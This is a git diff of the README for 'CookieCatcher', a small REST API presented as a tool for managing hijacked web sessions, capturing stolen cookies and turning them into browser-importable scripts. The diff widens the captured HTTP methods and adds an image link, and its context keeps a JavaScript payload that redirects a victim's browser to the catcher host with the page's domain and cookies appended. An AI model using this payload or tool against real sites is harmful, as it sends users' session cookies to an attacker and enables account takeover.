@@ -1,8 +1,10 @@
 # CookieCatcher (version. 0.0.1)
 This is a mini and simple API REST for management of Web sessions that were hijacked.
 
+<center><img src="http://2.bp.blogspot.com/-1H9hR_zOsP8/VTflh5wSpEI/AAAAAAAAAPs/MoLPDkpRRuI/s1600/Screen%2BShot%2B2015-04-22%2Bat%2B1.18.09%2BPM.png"></center>
+
 ### Features (that is simple)
-- Capture request through GET or POST (method)
+- Capture request through GET, POST, HEAD, OPTIONS, DELETE, PUT or PATCH (methods)
 - Parse to cookies format
 - Create script to import into your browser
 
@@ -28,6 +30,7 @@ Normal request GET (redirect)
 ```javascript
 document.location.href="http://cookieCatcher/session/"+document.domain+"/"+document.cookie;
 ```
+You can see the file: example.html
 
 #### Made with love in Colombia.
 # License:
